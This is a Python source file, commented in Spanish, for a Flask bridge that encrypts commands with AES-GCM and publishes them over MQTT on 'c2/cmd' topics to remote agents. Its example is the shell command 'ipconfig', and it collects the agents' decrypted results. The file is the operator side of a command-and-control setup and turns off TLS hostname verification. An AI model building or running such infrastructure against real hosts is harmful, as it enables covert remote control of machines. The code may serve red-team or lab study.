#!/usr/bin/env python3
"""
Crypto Bridge — HTTP API para que n8n cifre/descifre mensajes MQTT sin Node.js.

n8n habla HTTP, el bridge habla MQTT con TLS + AES-GCM.

Uso:
    python3 bridge.py

Endpoints:
    POST /api/command   → cifra y publica un comando a un agente
    GET  /api/results   → obtiene resultados pendientes (buffer)
    GET  /api/agents    → obtiene registros pendientes (buffer)
    GET  /api/health    → estado del bridge
"""

import os
import json
import sys
import time
from collections import deque
from pathlib import Path

from flask import Flask, request, jsonify
import paho.mqtt.client as mqtt

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from crypto_lib.cipher import Cipher

# ──────────────────────────────────────────────
# Configuración desde variables de entorno
# ──────────────────────────────────────────────

MQTT_HOST = os.getenv("MQTT_HOST", "localhost")
MQTT_PORT = int(os.getenv("MQTT_PORT", "8883"))
MQTT_CLIENT_ID = os.getenv("MQTT_CLIENT_ID", "crypto-bridge")

PSK_FILE = os.getenv("PSK_FILE", "crypto_lib/psk.key")
STATE_FILE = os.getenv("STATE_FILE", "/tmp/bridge.state")

CA_CERT = os.getenv("CA_CERT", "config/certs/ca.crt")
CLIENT_CERT = os.getenv("CLIENT_CERT", "config/certs/bridge.crt")
CLIENT_KEY = os.getenv("CLIENT_KEY", "config/certs/bridge.key")

BRIDGE_HOST = os.getenv("BRIDGE_HOST", "0.0.0.0")
BRIDGE_PORT = int(os.getenv("BRIDGE_PORT", "5000"))

# ──────────────────────────────────────────────
# Inicializar crypto
# ──────────────────────────────────────────────

if not Path(PSK_FILE).exists():
    print(f"[!] PSK file not found: {PSK_FILE}")
    print(f"[!] Generate one with: python3 crypto_lib/cipher.py genkey {PSK_FILE}")
    sys.exit(1)

with open(PSK_FILE, "rb") as f:
    key = f.read()

cipher = Cipher(key, state_file=STATE_FILE)
print(f"[+] Cipher ready (key: {len(key)} bytes, state: {STATE_FILE})")

# ──────────────────────────────────────────────
# Buffers de mensajes (para que n8n los consuma)
# ──────────────────────────────────────────────

results_buffer: deque = deque(maxlen=1000)
registers_buffer: deque = deque(maxlen=1000)

# ──────────────────────────────────────────────
# MQTT client (V2 callback + MQTTv5)
# ──────────────────────────────────────────────

app = Flask(__name__)

mqtt_connected = False  # tracking manual porque is_connected() no siempre es confiable


def on_connect(client, userdata, flags, rc, properties=None):
    """Callback cuando el cliente MQTT se conecta (o reconecta)."""
    global mqtt_connected
    if rc == 0:
        mqtt_connected = True
        print(f"[MQTT] Connected to {MQTT_HOST}:{MQTT_PORT}")
        client.subscribe("c2/agents/register", qos=1)
        client.subscribe("c2/res/#", qos=1)
        print("[MQTT] Subscribed to c2/agents/register, c2/res/#")
    else:
        mqtt_connected = False
        # rc > 0 significa error de conexión MQTT (no ACL — eso viene en on_publish)
        print(f"[MQTT] Connection failed (rc={rc})")


def on_disconnect(client, userdata, reason_code, properties=None):
    """Callback de desconexión. paho-mqtt reconecta automáticamente."""
    global mqtt_connected
    mqtt_connected = False
    if reason_code != 0:
        print(f"[MQTT] Unexpected disconnect (rc={reason_code}), reconnecting...")


def on_publish(client, userdata, mid, reason_code, properties=None):
    """Callback cuando el broker responde al PUBLISH (QoS 1: PUBACK).

    reason_code < 128  → éxito (0=Success, 16=NoMatchingSubscribers)
    reason_code >= 128 → error (135=NotAuthorized, etc.)
    """
    if reason_code >= 128:
        print(f"[MQTT] PUBLISH denied by broker (mid={mid}, rc={reason_code})")
        print(f"[MQTT]   Check ACL: does this client have permission for the topic?")


def on_message(client, userdata, msg):
    try:
        payload = json.loads(msg.payload)

        if msg.topic == "c2/agents/register":
            registers_buffer.append(payload)
            print(f"[BUF] Register from {payload.get('agent_id', '?')}")

        elif msg.topic.startswith("c2/res/"):
            # El payload está cifrado — el bridge lo descifra antes de
            # entregarlo a n8n para que n8n nunca toque crypto
            try:
                decrypted = cipher.decrypt(payload)
                result = json.loads(decrypted)
                results_buffer.append(result)
                print(f"[BUF] Result from {result.get('agent_id', '?')}: "
                      f"{result.get('task_id', '?')} → {result.get('status', '?')}")
            except Exception as e:
                print(f"[!] Failed to decrypt result: {e}")
                results_buffer.append({"error": str(e), "raw": payload})

    except json.JSONDecodeError:
        print(f"[!] Non-JSON message on {msg.topic}")
    except Exception as e:
        print(f"[!] Error processing {msg.topic}: {e}")


mqtt_client = mqtt.Client(
    client_id=MQTT_CLIENT_ID,
    callback_api_version=mqtt.CallbackAPIVersion.VERSION2,
    protocol=mqtt.MQTTv5,
)

# TLS: el server cert tiene CN=c2-broker, conectamos a localhost
# tls_insecure_set salta la verificación de hostname (seguro en entorno controlado)
mqtt_client.tls_set(CA_CERT, certfile=CLIENT_CERT, keyfile=CLIENT_KEY)
mqtt_client.tls_insecure_set(True)

# Reconexión automática con backoff exponencial
mqtt_client.reconnect_delay_set(min_delay=1, max_delay=30)

# Callbacks V2
mqtt_client.on_connect = on_connect
mqtt_client.on_disconnect = on_disconnect
mqtt_client.on_publish = on_publish
mqtt_client.on_message = on_message

# ──────────────────────────────────────────────
# Endpoints HTTP para n8n
# ──────────────────────────────────────────────


@app.route("/api/command", methods=["POST"])
def send_command():
    """Cifra y publica un comando a un agente.

    La publicación es asíncrona (QoS 1). El bridge acepta el mensaje
    y lo encola. Si el broker lo rechaza (ACL), se loguea en on_publish.

    Body:
    {
        "agent_id": "AG001",
        "command": "ipconfig",
        "command_type": "shell",
        "task_id": "TASK001"
    }

    Returns HTTP 202 si el mensaje se encoló correctamente.
    """
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "JSON body required"}), 400

    agent_id = data.get("agent_id")
    command = data.get("command")
    if not agent_id or not command:
        return jsonify({"error": "agent_id and command are required"}), 400

    payload = {
        "task_id": data.get("task_id"),
        "command": command,
        "command_type": data.get("command_type", "shell"),
    }

    try:
        encrypted = cipher.encrypt_to_json(payload)
    except Exception as e:
        return jsonify({"error": f"Encryption failed: {e}"}), 500

    topic = f"c2/cmd/{agent_id}"
    info = mqtt_client.publish(topic, encrypted, qos=1)

    if info.rc == mqtt.MQTT_ERR_SUCCESS:
        print(f"[CMD] Queued for publish to {topic} (task: {data.get('task_id', '?')})")
        return jsonify({
            "status": "accepted",
            "topic": topic,
            "task_id": data.get("task_id"),
            "agent_id": agent_id,
        }), 202  # 202 Accepted → la publicación es asíncrona
    else:
        return jsonify({"error": f"MQTT publish failed (rc={info.rc})"}), 500


@app.route("/api/results", methods=["GET"])
def get_results():
    """Devuelve y limpia el buffer de resultados."""
    results = list(results_buffer)
    results_buffer.clear()
    return jsonify(results)


@app.route("/api/agents", methods=["GET"])
def get_agents():
    """Devuelve y limpia el buffer de registros de agentes."""
    agents = list(registers_buffer)
    registers_buffer.clear()
    return jsonify(agents)


@app.route("/api/health", methods=["GET"])
def health():
    return jsonify({
        "status": "ok",
        "mqtt_connected": mqtt_client.is_connected(),
        "mqtt_host": MQTT_HOST,
        "mqtt_port": MQTT_PORT,
        "results_buffered": len(results_buffer),
        "registers_buffered": len(registers_buffer),
    })


# ──────────────────────────────────────────────
# Arranque
# ──────────────────────────────────────────────

def main():
    print("[+] Starting Crypto Bridge...")
    print(f"    MQTT: {MQTT_HOST}:{MQTT_PORT}")
    print(f"    HTTP: {BRIDGE_HOST}:{BRIDGE_PORT}")
    print(f"    PSK:  {PSK_FILE}")
    print(f"    Certs: {CA_CERT}, {CLIENT_CERT}")

    # Intentar conexión inicial al broker
    connected = False
    for attempt in range(3):
        try:
            mqtt_client.connect(MQTT_HOST, MQTT_PORT)
            mqtt_client.loop_start()
            connected = True
            print(f"[MQTT] Connection initiated (attempt {attempt + 1})")
            break
        except Exception as e:
            print(f"[MQTT] Connection attempt {attempt + 1} failed: {e}")
            if attempt < 2:
                time.sleep(2)

    if not connected:
        print("[!] Bridge will start but MQTT is unavailable")
        print("[!] The bridge will retry automatically via reconnect_delay_set")

    app.run(host=BRIDGE_HOST, port=BRIDGE_PORT)


if __name__ == "__main__":
    main()
